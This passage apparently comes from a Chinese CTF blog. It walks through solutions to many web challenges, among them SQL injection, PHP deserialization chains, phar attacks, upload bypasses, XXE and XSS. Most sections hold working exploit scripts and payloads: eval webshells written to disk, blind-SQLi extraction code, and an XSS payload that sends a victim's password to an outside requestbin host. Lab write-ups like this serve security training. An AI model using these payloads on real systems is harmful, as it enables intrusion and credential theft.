m4aaannngggeee\";\n}\n?>\n```\n\n继续查看m4aaannngggeee\n\n```\n<?php\nif (FLAG_SIG != 1){\n    die(\"you can not visit it directly\");\n}\ninclude \"templates/upload.html\";\n\n?>\n```\n\n去看看upload.html，再转回upllloadddd.php\n\n```php\n//upllloadddd.php\n<?php\n$newfile = $path.$filename;\necho \"file upload success<br />\";\necho $filename;\n$picdata = system(\"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\".$filename.\" | base64 -w 0\");\necho \"<img src='data:image/png;base64,\".$picdata.\"'></img>\";\n?>\n\n```\n\n在这没有任何过滤，直接修改文件名就能执行系统命令\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011611789.png)\n\n## [FireshellCTF2020]Caas\n\n试了试php和python代码，都编译失败，各种编程语言都尝试一下发现是C的编译器，你好世界试试\n\n```C\n#include <stdio.h>\nint main() {\n    printf(\"Hello, World! \\n\");\n    return 0;\n}\n```\n\n看wp知道是头文件包含报错，试试/etc/passwd，有回显\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011632778.png)\n\n直接包含flag拿到\n\n## October 2019 Twice SQL Injection\n\n题目名字很明显了，二次注入，注入点在username处\n\n```\nkkk' union select database() #\n\nrua' union select group_concat(table_name) from information_schema.tables where table_schema='ctftraining' #\n\nkkk' union select group_concat(column_name) from information_schema.columns where table_name='flag'#\n\nkkk' union select flag from flag #\n```\n\n做完可以看看源码语句被构造成了什么样\n\n```php\n插入\nif (isset($_POST['username']) && $_POST['username'] != \"\") {\n\t$username = addslashes($_POST['username']);\n\t$password = md5($_POST['password']);\n\tif (mysql_query(\"insert into users(username,password,info) values ('{$username}','{$password}','十月太懒，没有简介');\")) {\n\t\t\theader(\"Location: /?action=login\");\n}\n取出\n$info = query(\"select info from users where username='{$_SESSION['username']}';\");\n```\n\n可以看到从数据库中取出info数据的时候并没有对username进行addslash处理，会导致查询的是kkk这个用户的信息，但是我们并没有注册过这个用户，导致后面的union select执行，产生了二次注入漏洞\n\n## [EIS 2019]EzPOP\n\n上来就给了源码，不错~~不错个毛线啊md这什么玩意啊！！！！！！！！！~~\n\n```php\n<?php\nerror_reporting(0);\n\nclass A {\n    protected $store;\n    protected $key;\n    protected $expire;\n    public function __construct($store, $key = 'flysystem', $expire = null) {\n        $this->key = $key;\n        $this->store = $store;\n        $this->expire = $expire;\n    }\n    public function cleanContents(array $contents) {\n        $cachedProperties = array_flip([\n            'path', 'dirname', 'basename', 'extension', 'filename',\n            'size', 'mimetype', 'visibility', 'timestamp', 'type',\n        ]);//这个函数反转数组中所有的键以及它们关联的值，原来是1->path，现在是path->1\n        foreach ($contents as $path => $object) {\n            if (is_array($object)) {\n                $contents[$path] = array_intersect_key($object, $cachedProperties);//此处比较两个数组的键名，并返回交集\n            }\n        }\n        return $contents;\n    }\n    public function getForStorage() {\n        $cleaned = $this->cleanContents($this->cache);//传入了cache变量，而我们这里发现并没有cache这个变量，所以这个需要后续把变量定义传值\n        return json_encode([$cleaned, $this->complete]);//看到返回值被json_encode\n    }\n    public function save() {\n        $contents = $this->getForStorage();、\n        $this->store->set($this->key, $contents, $this->expire);//这里set函数在B类中存在，到后面再审计\n    }\n    public function __destruct() {//明显这里就是反序列化头了\n        if (!$this->autosave) {\n            $this->save();\n        }\n    }\n}\nclass B {\n    protected function getExpireTime($expire): int {//这边返回的是int参数\n        return (int) $expire;\n    }\n    public function getCacheKey(string $name): string {//拼接字符串\n        return $this->options['prefix'] . $name;\n    }\n    protected function serialize($data): string {//反正就是把所有内容经过options['serialize']名称函数转换了\n        if (is_numeric($data)) {\n            return (string) $data;\n        }\n        $serialize = $this->options['serialize'];\n        return $serialize($data);\n    }\n    public function set($name, $value, $expire = null): bool{\n        $this->writeTimes++;\n        if (is_null($expire)) {//这边$expire可控，直接非null\n            $expire = $this->options['expire'];\n        }\n        $expire = $this->getExpireTime($expire);//转int类型\n        $filename = $this->getCacheKey($name);//这里会把内容变成$this->options['prefix'].$name\n        $dir = dirname($filename);//把如/var/www/html/index.php的字符串转为/var/www/html这样\n        if (!is_dir($dir)) {\n            try {\n                mkdir($dir, 0755, true);\n            } catch (\\Exception $e) {\n                // 创建失败\n            }\n        }\n        $data = $this->serialize($value);//把传入的$value转为字符串\n        if ($this->options['data_compress'] && function_exists('gzcompress')) {\n            //数据压缩，直接options['data_compress']=0绕过\n            $data = gzcompress($data, 3);\n        }\n        $data = \"<?php\\n//\" . sprintf('%012d', $expire) . \"\\n exit();?>\\n\" . $data;//这里需要绕过死亡exit\n        $result = file_put_contents($filename, $data);//这很明显写shell了\n        if ($result) {\n            return true;\n        }\n        return false;\n    }\n}\n\nif (isset($_GET['src']))\n{\n    highlight_file(__FILE__);\n}\n\n$dir = \"uploads/\";\n\nif (!is_dir($dir))\n{\n    mkdir($dir);\n}\nunserialize($_GET[\"data\"]);\n```\n\n写一下绕过死亡exit的方法，使用base64解码`<?php\\n//\" . sprintf('%012d', $expire) . \"\\n exit();?>\\n`这个字符串中真正会被base64解码识别到的内容实际上是`php12位长度的数字exit`而base64又是以4个字节为一组来进行解码的，所以我们data中的内容就是随便一个单字符加上一句话木马base64编码后的内容即可\n\n最终构造出的链子就是触发A类销毁引导B类set函数执行\n\n```php\n//exp.php\n<?php\nerror_reporting(0);\n\nclass A {\n    protected $store;\n    protected $key;//文件的name\n    protected $expire;//无所谓其实\n    public function __construct()\n    {\n        $this->cache = array();\n        $this->complete = base64_encode(\"xxx\".base64_encode('<?php @eval($_POST[\"kkk\"]);?>'));\n        $this->key = \"shell.php\";\n        $this->store = new B();\n        $this->autosave = false;\n        $this->expire = 0;\n    }\n}\nclass B {\n    public $options = array();\n    function __construct()\n    {\n        $this->options['serialize'] = 'base64_decode';\n        $this->options['prefix'] = 'php://filter/write=convert.base64-decode/resource=';\n        $this->options['data_compress'] = false;\n    }\n}\nprint(urlencode(serialize(new A)));\n```\n\n## [WMCTF2020]Make PHP Great Again\n\nPHP最新版的小Trick， require_once包含的软链接层数较多时once的hash匹配会直接失效造成重复包含\n\n## [极客大挑战 2020]Greatphp\n\n先扔一个exp\n\n```\n<?php\nerror_reporting(0);\nclass SYCLOVER {\n    public $syc;\n    public $lover;\n\n}\n\n$str = \"?><?=include~\".urldecode(\"%d0%99%93%9e%98\").\"?>\";\n$a=new Error($str,1);$b=new Error($str,2);\n$c = new SYCLOVER();\n$c->syc = $a;\n$c->lover = $b;\necho urlencode(serialize($c));\n?>\n\n```\n\n\n\n\n\n\n\n\n\n\n\n## [SUCTF 2018]MultiSQL\n\n注册登录，在头像处似乎有文件上传\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206020934705.png)\n\n上传后发现任何文件都被重命名为jpg格式\n\n用户信息处有sql注入点，可使用堆叠注入\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206020935563.png)\n\n过滤了大量关键字，用设定语句变量绕过\n\n```\nstr=\"select '<?php eval($_POST[kkk]);?>' into outfile '/var/www/html/favicon/shell.php';\"\nlen_str=len(str)\nfor i in range(0,len_str):\n\tif i == 0:\n\t\tprint('char(%s'%ord(str[i]),end=\"\")\n\telse:\n\t\tprint(',%s'%ord(str[i]),end=\"\")\nprint(')')\n```\n\n构造写shell payload如下\n\n```\n2;set @a=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,107,107,107,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @a;execute query;\n```\n\nRCE拿flag\n\n## [SWPU2019]Web4\n\nSQL注入，在username处放入单引号报错，但是再加上;就能执行，说明存在堆叠注入，先构造写shell语句发现无法写入，所以构造布尔注入语句\n\n```python\nimport requests, time\nimport json\n\n\ndef str_to_hex(strings):\n    by = bytes(strings, 'UTF-8')  # 先将输入的字符串转化成字节码\n    hexstring = by.hex()\n    return hexstring\nurl = \"http://b28f3ae7-5844-4587-9d21-69687f9fc61d.node4.buuoj.cn:81/index.php?r=Login/Login\"\nflag = \"\"\nfor i in range(1, 100):\n    low = 32\n    high = 128\n    mid = (low + high) // 2\n    while low < high:\n        payload = \"select if(ascii(substr((select flag from flag),{},1))>{},sleep(2),0)\".format(i, mid)\n        zpayload = \"1';set @a=0x{};prepare b from @a;execute b;\".format(str_to_hex(payload))\n        data = {\n            'username': zpayload,\n            'password': '111'\n        }\n        datas = json.dumps(data)\n        time1 = time.time()\n        r = requests.post(url, data=datas)\n        time2 = time.time()\n        times = time2 - time1\n        if times > 2:\n            low = mid + 1\n        else:\n            high = mid\n        mid = (low + high) // 2\n        print(low, mid, high, times)\n    flag += chr(mid)\n    print(flag)\n    if mid == 32:\n        break\n```\n\n跑出一个文件名，下载查看\n\n```php\n///Common/fun.php\n// 路由控制跳转至控制器\nif(!empty($_REQUEST['r']))\n{\n\t$r = explode('/', $_REQUEST['r']);\n\tlist($controller,$action) = $r;\n\t$controller = \"{$controller}Controller\";\n\t$action = \"action{$action}\";\n\tif(class_exists($controller))\n\t{\n\t\tif(method_exists($controller,$action))\n\t\t{\n\t\t\t//\n\t\t}\n\t\telse\n\t\t{\n\t\t\t$action = \"actionIndex\";\n\t\t}\n\t}\n\telse\n\t{\n\t\t$controller = \"LoginController\";\n        $action = \"actionIndex\";\n\t}\n    $data = call_user_func(array( (new $controller), $action));\n} else {\n    header(\"Location:index.php?r=Login/Index\");\n}\n\n```\n\n```php\n/Controller/BaseController\n<?php \n//所有控制器的父类\nclass BaseController\n{\n\t/*\n\t * 加载视图文件\n\t * viewName 视图名称\n\t * viewData 视图分配数据\n\t*/\n\tprivate $viewPath;\n\tpublic function loadView($viewName ='', $viewData = [])\n\t{\n\t\t$this->viewPath = BASE_PATH . \"/View/{$viewName}.php\";\n\t\tif(file_exists($this->viewPath))\n\t\t{\n\t\t\textract($viewData);//将数组中的内容变为变量\n\t\t\tinclude $this->viewPath;//包含渲染模版\n\t\t}\n\t}\n}\n```\n\n```php\n///View/userIndex\n<?php\n\tif(!isset($img_file)) {\n\t\t$img_file = '/../favicon.ico';\n\t}\n\t$img_dir = dirname(__FILE__) . $img_file;\n\t$img_base64 = imgToBase64($img_dir);\n\techo '<img src=\"' . $img_base64 . '\">';       //任意文件base64编码\n?>\n```\n\n审计完payload就出来了\n\n```\n?r=User/Index&img_file=/../flag.php\n```\n\n图片处读base64解码即可\n\n## [GXYCTF2019]BabysqliV3.0\n\n我tm试了半天你告诉我弱口令？？？？？？？？？？？？？？？？？？？？？？？？/\n\n`admin/password`\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206021103197.png)\n\n明显的文件读取，伪协议读取\n\n```php\n//upload.php\n<?php\nerror_reporting(0);\nclass Uploader{\n        public $Filename;\n        public $cmd;\n        public $token;\n        function __construct(){\n                $sandbox = getcwd().\"/uploads/\".md5($_SESSION['user']).\"/\";\n                $ext = \".txt\";\n                @mkdir($sandbox, 0777, true);\n                if(isset($_GET['name']) and !preg_match(\"/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i\", $_GET['name'])){\n                        $this->Filename = $_GET['name'];\n                }\n                else{\n                        $this->Filename = $sandbox.$_SESSION['user'].$ext;\n                }\n                $this->cmd = \"echo '<br><br>Master, I want to study rizhan!<br><br>';\";\n                $this->token = $_SESSION['user'];\n        }\n        function upload($file){\n                global $sandbox;\n                global $ext;\n                if(preg_match(\"[^a-z0-9]\", $this->Filename)){\n                        $this->cmd = \"die('illegal filename!');\";\n                }\n                else{\n                        if($file['size'] > 1024){\n                                $this->cmd = \"die('you are too big (′▽`〃)');\";\n                        }\n                        else{\n                                $this->cmd = \"move_uploaded_file('\".$file['tmp_name'].\"', '\" . $this->Filename . \"');\";\n                        }\n                }\n        }\n        function __toString(){\n                global $sandbox;\n                global $ext;\n                // return $sandbox.$this->Filename.$ext;\n                return $this->Filename;\n        }\n        function __destruct(){\n                if($this->token != $_SESSION['user']){\n                        $this->cmd = \"die('check token falied!');\";\n                }\n                eval($this->cmd);\n        }\n}\nif(isset($_FILES['file'])) {\n        $uploader = new Uploader();\n        $uploader->upload($_FILES[\"file\"]);\n        if(@file_get_contents($uploader)){\n                echo \"下面是你上传的文件：<br>\".$uploader.\"<br>\";\n                echo file_get_contents($uploader);\n        }\n}\n?>\n```\n\n此处有一个file_get_contents存在phar反序列化，任意上传文件可以拿到`$_SESSION['user']`，然后构造exp\n\n```php\n<?php\nerror_reporting(0);\nclass Uploader{\n    public $Filename;\n    public $cmd;\n    public $token;\n}\n$upload=new Uploader();\n$upload->cmd = \"highlight_file('/var/www/html/flag.php');\";\n$upload->token = 'GXY380513e563f39abb95bd589a6d2648ec';\n$phar = new Phar(\"phar.phar\");\n$phar -> startBuffering();\n$phar -> setStub(\"<?php __HALT_COMPILER();?>\");\n$phar -> setMetadata($upload);\n$phar->addFromString(\"test.txt\", \"test\");\n$phar -> stopBuffering();\n?>\n```\n\n上传后将name参数改为`phar:///var/www/html/uploads/da3fd6a2cf9c6007bda4c8a58e394ba2/GXY380513e563f39abb95bd589a6d2648ec.txt`刷新即可拿flag\n\n## [SUCTF 2018]annonymous\n\n源码\n\n```php\n<?php\n$MY = create_function(\"\",\"die(`cat flag.php`);\");//创建无名函数\n$hash = bin2hex(openssl_random_pseudo_bytes(32));//生成随机数\neval(\"function SUCTF_$hash(){\"\n    .\"global \\$MY;\"\n    .\"\\$MY();\"\n    .\"}\");//给了无名函数一个名字，但是是随机的\nif(isset($_GET['func_name'])){\n    $_GET[\"func_name\"]();\n    die();\n}\nshow_source(__FILE__);\n```\n\n> 匿名函数其实是有真正的名字，为%00lambda_%d(%d格式化为当前进程的第n个匿名函数,n的范围0-999)\n\n通过上面这个方法，用个脚本就能跑出来\n\n```python\nimport requests\nfor i in range(1,1000):\n    r=requests.get(url=f'http://bb841c48-16f0-4700-a630-f8a44d9cfced.node4.buuoj.cn:81/?func_name=%00lambda_{i}')\n    print(r.status_code)\n    if 'flag' in r.text:\n        print(r.text)\n        break\n```\n\n## [RoarCTF 2019]Simple Upload\n\n\n\n\n\n```php\n<?php \nnamespace Home\\Controller; \n\nuse Think\\Controller; \n\nclass IndexController extends Controller \n{ \n    public function index() \n    { \n        show_source(__FILE__); \n    } \n    public function upload() \n    { \n        $uploadFile = $_FILES['file'] ; \n         \n        if (strstr(strtolower($uploadFile['name']), \".php\") ) { \n            return false; \n        } \n         \n        $upload = new \\Think\\Upload();// 实例化上传类 \n        $upload->maxSize  = 4096 ;// 设置附件上传大小 \n        $upload->allowExts  = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型 \n        $upload->rootPath = './Public/Uploads/';// 设置附件上传目录 \n        $upload->savePath = '';// 设置附件上传子目录 \n        $info = $upload->upload() ; \n        if(!$info) {// 上传错误提示错误信息 \n          $this->error($upload->getError()); \n          return; \n        }else{// 上传成功 获取上传文件信息 \n          $url = __ROOT__.substr($upload->rootPath,1).$info['file']['savepath'].$info['file']['savename'] ; \n          echo json_encode(array(\"url\"=>$url,\"success\"=>1)); \n        } \n    } \n}\n```\n\n1、看源码可以看出来是thinkphp的文件上传，代码中过滤了php文件后缀，而在thinkphp中文件上传的时候会对文件名进行这样的处理\n\n```php\nforeach ($files as $key => $file) {\n    $file['name']  = strip_tags($file['name']);//这里将<>标签删掉\n\t\tif(!isset($file['key']))   $file['key']    =   $key;\n\t\t/* 通过扩展获取文件类型，可解决FLASH上传$FILES数组返回文件类型错误的问题 */\n    if(isset($finfo)){\n        $file['type']   =   finfo_file ( $finfo ,  $file['tmp_name'] );\n    }\n```\n\n所以可以构造如下的payload\n\n```python\nimport  requests\nurl = \"http://bb841c48-16f0-4700-a630-f8a44d9cfced.node4.buuoj.cn:81/index.php/home/index/upload\"\nfiles={'file':('1.<>php',\"<?php eval($_GET['cmd'])?>\")}\nr=requests.post(url=url,files=files)\nprint(r.text)\n```\n\n2、think PHP里的upload()函数在不传参的情况下是批量上传的，所以如果上传多个文件\n\n```php\n$uploadFile = $_FILES['file'] ;\n\tif (strstr(strtolower($uploadFile['name']), \".php\") ) {\n  \treturn false;\n  }\n```\n\n此处name即为数组，可直接绕过\n\n```python\nimport  requests\nurl = \"http://f2d454a6-807f-4da4-9815-e366f39612d8.node4.buuoj.cn:81/index.php/home/index/upload\"\nfiles = {'file':(\"1.txt\",\"\")}\nfiles2={'file[]':('1.php',\"<?php eval($_GET['cmd'])?>\")}\nr = requests.post(url,files = files)\nprint (r.text)\nr = requests.post(url,files = files2)\nprint (r.text)\nr = requests.post(url,files = files)\nprint (r.text)\n```\n\n继续往下走，发现虽然php文件确实上传成功了，但是并没有返回文件名，看前后两个文件重命名后的内容发现文件名的生成是有规律的，了解后知道文件名是通过uniqid得到的，这是根据当前时间来得到的随机数，那么根据前后两个文件名不同的位置进行爆破即可\n\n## [GoogleCTF2019 Quals]Bnv\n\n选择城市并且进行submit时会向api发送一个json格式的post请求，这里其实就有可能存在XXE注入\n\n在burp中尝试通过xml方式传入原始数据，提示未发现<标签\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061819430.png)\n\n按照xml格式构造内容提示没有DTD\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061821510.png)\n\n那我们在放一个DTD进去，提示有未声明的元素消息\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061823346.png)\n\n此处类似于在使用变量前要先对变量进行声明，我们只需要声明一下message元素即可，此时回显正常\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061829146.png)\n\n那么下一步我们就要想如何构造才能让flag回显，我们先看是否能读取本地文件，提示文件虽然存在但并不是一个格式良好的xml文件，所以加载中断了，将/flag传入发现回显相同，说明flag文件存在，但是我们怎么读取呢？\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061833299.png)\n\n一个利用本地DTD来XXE输出任何文件内容的小[trick](https://mohemiv.com/tags/xxe/)\n\n> 本质上我们可以使用本地DTD文件的实体，但是我们需要在完全加载它之前对它进行定义\n>\n> 而且Linux设备可能在/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd中有一个DTD文件。并且这个文件又一个名为ISOamsa的实体，所以我们可以使用它来写DTD代码。现在我们来制作DTD代码。\n\n所以我们首先尝试放入一个错误的文件位置，可以看到文件名被回显出来了\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061843021.png)\n\n所以我们要做的就是构造DTD代码使得读取的文件名是我们实际要读取的文件的内容，使得报错导致实际读取的文件内容被放入虚假的文件名中被爆出\n\n大佬构造出的xml如下\n\n```xml-dtd\n<?xml version=\"1.0\"?>\n<!DOCTYPE message[\n    <!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\">\n    <!ENTITY % ISOamso '\n    <!ENTITY &#x25; file SYSTEM \"file:///flag\">\n    <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///aaaaa/&#x25;file;&#x27;>\">\n    &#x25;eval;\n    &#x25;error;\n'>\n%local_dtd;\n]>\n```\n\n```xml-dtd\n<!DOCTYPE message [\n    <!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\">\n    <!ENTITY % ISOamso '\n        <!ENTITY % file SYSTEM \"file:///flag\">\n        <!ENTITY % eval \"<!ENTITY % error SYSTEM 'file:///jlan/%file;'>\">\n        %eval;\n        %error;\n    '>\n    %local_dtd;\n]>\n```\n\n\n\n## [GWCTF 2019]mypassword\n\n有反馈，合理怀疑XSS\n\n```php\n\t\tif(is_array($feedback)){\n\t\t\t\techo \"<script>alert('反馈不合法');</script>\";\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\t$blacklist = ['_','\\'','&','\\\\','#','%','input','script','iframe','host','onload','onerror','srcdoc','location','svg','form','img','src','getElement','document','cookie'];\n\t\t\tforeach ($blacklist as $val) {\n\t\t        while(true){\n\t\t            if(stripos($feedback,$val) !== false){\n\t\t                $feedback = str_ireplace($val,\"\",$feedback);\n\t\t            }else{\n\t\t                break;\n\t\t            }\n\t\t        }\n\t\t    }\n```\n\n构造payload\n\n```javascript\n<incookieput type=\"text\" name=\"username\">\n<incookieput type=\"password\" name=\"password\">\n<scrcookieipt scookierc=\"./js/login.js\"></scrcookieipt>\n<scrcookieipt>\n    var psw = docucookiement.getcookieElementsByName(\"password\")[0].value;\n    docucookiement.locacookietion=\"http://http.requestbin.buuoj.cn/1is06vp1/?a=\"+psw;\n</scrcookieipt>\n```\n\n## [DDCTF 2019]homebrew event loop\n\n欣赏源码\n\n```python\nfrom flask import Flask, session, request, Response\nimport urllib\n\napp = Flask(__name__)\napp.secret_key = '*********************'  # censored\nurl_prefix = '/d5afe1f66147e857'\n\n\ndef FLAG():\n    return '*********************'  # censored\n\n\ndef trigger_event(event):\n    session['log'].append(event)\n    if len(session['log']) > 5:\n        session['log'] = session['log'][-5:]\n    if type(event) == type([]):\n        request.event_queue += event\n    else:\n        request.event_queue.append(event)\n\n\ndef get_mid_str(haystack, prefix, postfix=None):\n    haystack = haystack[haystack.find(prefix)+len(prefix):]\n    if postfix is not None:\n        haystack = haystack[:haystack.find(postfix)]\n    return haystack\n\n\nclass RollBackException:\n    pass\n\n\ndef execute_event_loop():\n    valid_event_chars = set(\n        'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#')\n    resp = None\n    while len(request.event_queue) > 0:\n        # `event` is something like \"action:ACTION;ARGS0#ARGS1#ARGS2......\"\n        event = request.event_queue[0]\n        request.event_queue = request.event_queue[1:]\n        if not event.startswith(('action:', 'func:')):\n            continue\n        for c in event:\n            if c not in valid_event_chars:\n                break\n        else:\n            is_action = event[0] == 'a'\n            action = get_mid_str(event, ':', ';')\n            args = get_mid_str(event, action+';').split('#')\n            try:\n                event_handler = eval(\n                    action + ('_handler' if is_action else '_function'))\n                ret_val = event_handler(args)\n            except RollBackException:\n                if resp is None:\n                    resp = ''\n                resp += 'ERROR! All transactions have been cancelled. <br />'\n                resp += '<a href=\"./?action:view;index\">Go back to index.html</a><br />'\n                session['num_items'] = request.prev_session['num_items']\n                session['points'] = request.prev_session['points']\n                break\n            except Exception, e:\n                if resp is None:\n                    resp = ''\n                # resp += str(e) # only for debugging\n                continue\n            if ret_val is not None:\n                if resp is None:\n                    resp = ret_val\n                else:\n                    resp += ret_val\n    if resp is None or resp == '':\n        resp = ('404 NOT FOUND', 404)\n    session.modified = True\n    return resp\n\n\n@app.route(url_prefix+'/')\ndef entry_point():\n    querystring = urllib.unquote(request.query_string)\n    request.event_queue = []\n    if querystring == '' or (not querystring.startswith('action:')) or len(querystring) > 100:\n        querystring = 'action:index;False#False'\n    if 'num_items' not in session:\n        session['num_items'] = 0\n        session['points'] = 3\n        session['log'] = []\n    request.prev_session = dict(session)\n    trigger_event(querystring)\n    return execute_event_loop()\n\n# handlers/functions below --------------------------------------\n\n\ndef view_handler(args):\n    page = args[0]\n    html = ''\n    html += '[INFO] you have {} diamonds, {} points now.<br />'.format(\n        session['num_items'], session['points'])\n    if page == 'index':\n        html += '<a href=\"./?action:index;True%23False\">View source code</a><br />'\n        html += '<a href=\"./?action:view;shop\">Go to e-shop</a><br />'\n        html += '<a href=\"./?action:view;reset\">Reset</a><br />'\n    elif page == 'shop':\n        html += '<a href=\"./?action:buy;1\">Buy a diamond (1 point)</a><br />'\n    elif page == 'reset':\n        del session['num_items']\n        html += 'Session reset.<br />'\n    html += '<a href=\"./?action:view;index\">Go back to index.html</a><br />'\n    return html\n\n\ndef index_handler(args):\n    bool_show_source = str(args[0])\n    bool_download_source = str(args[1])\n    if bool_show_source == 'True':\n\n        source = open('eventLoop.py', 'r')\n        html = ''\n        if bool_download_source != 'True':\n            html += '<a href=\"./?action:index;True%23True\">Download this .py file</a><br />'\n            html += '<a href=\"./?action:view;index\">Go back to index.html</a><br />'\n\n        for line in source:\n            if bool_download_source != 'True':\n                html += line.replace('&', '&amp;').replace('\\t', '&nbsp;'*4).replace(\n                    ' ', '&nbsp;').replace('<', '&lt;').replace('>', '&gt;').replace('\\n', '<br />')\n            else:\n                html += line\n        source.close()\n\n        if bool_download_source == 'True':\n            headers = {}\n            headers['Content-Type'] = 'text/plain'\n            headers['Content-Disposition'] = 'attachment; filename=serve.py'\n            return Response(html, headers=headers)\n        else:\n            return html\n    else:\n        trigger_event('action:view;index')\n\n\ndef buy_handler(args):#增加num_items\n    num_items = int(args[0])\n    if num_items <= 0:\n        return 'invalid number({}) of diamonds to buy<br />'.format(args[0])\n    session['num_items'] += num_items\n    trigger_event(['func:consume_point;{}'.format(\n        num_items), 'action:view;index'])\n\n\ndef consume_point_function(args):\n    point_to_consume = int(args[0])\n    if session['points'] < point_to_consume:\n        raise RollBackException()\n    session['points'] -= point_to_consume\n\n\ndef show_flag_function(args):\n    flag = args[0]\n    # return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.\n    return 'You naughty boy! ;) <br />'\n\n\ndef get_flag_handler(args):#最终拿flag\n    if session['num_items'] >= 5:\n        # show_flag_function has been disabled, no worries\n        trigger_event('func:show_flag;' + FLAG())\n    trigger_event('action:view;index')\n\n\nif __name__ == '__main__':\n    app.run(debug=False, host='0.0.0.0')\n```\n\n看源码中各个函数的功能，写到注释中了，可以看到如果需要拿flag就要调用`get_flag_handler`，而如果要执行就需要有5个`num_items`，通过`buy_handler`函数来增加`num_items`，但是钱不够，此时我们通过执行`trigger_event`函数来进行多函数执行，在进行扣费之前就拿取到flag\n\n```\n?action:trigger_event#;action:buy;5#action:get_flag;#\n```\n\n此时session已经被写入cookie了，由于该flask程序中并没有使用数据库，所以session中的内容实际上是储存在我们的cookie中（[戳这里看详情](https://www.leavesongs.com/PENETRATION/client-session-security.html)）得到session内容并使用`flask-session-cookie-manager`工具进行解密，拿到flag\n\n## [RootersCTF2019]babyWeb\n\nSQL注入，过滤已提醒`UNION SLEEP ' \" OR - BENCHMARK`\n\n先用order by测出列数，再用万能密码捞出flag\n\n```\n1 || 1=1 limit 0,1\n```\n\n## [HFCTF2020]BabyUpload\n\n源码先扔\n\n```php\n<?php\nerror_reporting(0);\nsession_save_path(\"/var/babyctf/\");\nsession_start();\nrequire_once \"/flag\";\nhighlight_file(__FILE__);\nif($_SESSION['username'] ==='admin')\n{\n    $filename='/var/babyctf/success.txt';\n    if(file_exists($filename)){\n            safe_delete($filename);\n            die($flag);\n    }\n}\nelse{\n    $_SESSION['username'] ='guest';\n}\n$direction = filter_input(INPUT_POST, 'direction');\n$attr = filter_input(INPUT_POST, 'attr');\n$dir_path = \"/var/babyctf/\".$attr;\nif($attr===\"private\"){\n    $dir_path .= \"/\".$_SESSION['username'];\n}\nif($direction === \"upload\"){\n    try{\n        if(!is_uploaded_file($_FILES['up_file']['tmp_name'])){\n            throw new RuntimeException('invalid upload');\n        }\n        $file_path = $dir_path.\"/\".$_FILES['up_file']['name'];\n        $file_path .= \"_\".hash_file(\"sha256\",$_FILES['up_file']['tmp_name']);\n        if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path)){\n            throw new RuntimeException('invalid file path');\n        }\n        @mkdir($dir_path, 0700, TRUE);\n        if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path)){\n            $upload_result = \"uploaded\";\n        }else{\n            throw new RuntimeException('error while saving');\n        }\n    } catch (RuntimeException $e) {\n        $upload_result = $e->getMessage();\n    }\n} elseif ($direction === \"download\") {\n    try{\n        $filename = basename(filter_input(INPUT_POST, 'filename'));\n        $file_path = $dir_path.\"/\".$filename;\n        if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path)){\n            throw new RuntimeException('invalid file path');\n        }\n        if(!file_exists($file_path)) {\n            throw new RuntimeException('file not exist');\n        }\n        header('Content-Type: application/force-download');\n        header('Content-Length: '.filesize($file_path));\n        header('Content-Disposition: attachment; filename=\"'.substr($filename, 0, -65).'\"');\n        if(readfile($file_path)){\n            $download_result = \"downloaded\";\n        }else{\n            throw new RuntimeException('error while saving');\n        }\n    } catch (RuntimeException $e) {\n        $download_result = $e->getMessage();\n    }\n    exit;\n}\n?>\n```\n\n新知识：可以通过上传session文件伪造session\n\n> **对于通过文件存储session的，不同的引擎存储方式有以下几种**\n>\n> php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值\n> php:存储方式是，键名+竖线+经过serialize()函数序列处理的值\n> php_serialize(php>5.5.4):存储方式是，经过serialize()函数序列化处理的值\n\n看代码，拿到flag的条件是，`$_SESSION['username'] ==='admin'`并且`/var/babyctf/success.txt`文件存在或`/var/babyctf/success.txt/`目录存在，首先尝试读取session文件判断session存储类型\n\n```\n\\x08usernames:5:\"guest\";\n```\n\n说明是php_binary方式存储的，下一步就是伪造session文件了，题目中文件上传后会被重命名为`文件名+_+文件内容的sha256计算后的内容`，编写脚本进行上传\n\n```python\nimport hashlib\nfrom io import BytesIO\nimport requests\n\nurl = 'http://650ec886-b0bc-410f-bb3c-0b8dda942bee.node4.buuoj.cn:81/index.php'\n# 第一步:上传伪造的session文件\nfiles = {\"up_file\": (\"sess\", BytesIO('\\x08usernames:5:\"admin\";'.encode('utf-8')))}\ndata = {\n    'direction': 'upload',\n    'attr': ''\n}\nres = requests.post(url, data=data, files=files)\n\n# 第二步:获取后面请求时的session_id\nsession_id = hashlib.sha256('\\x08usernames:5:\"admin\";'.encode('utf-8')).hexdigest()\n\n# 第三步:在/var/babyctf/下创建success.txt目录\ndata1 = {\n    'attr': 'success.txt',\n    'direction': 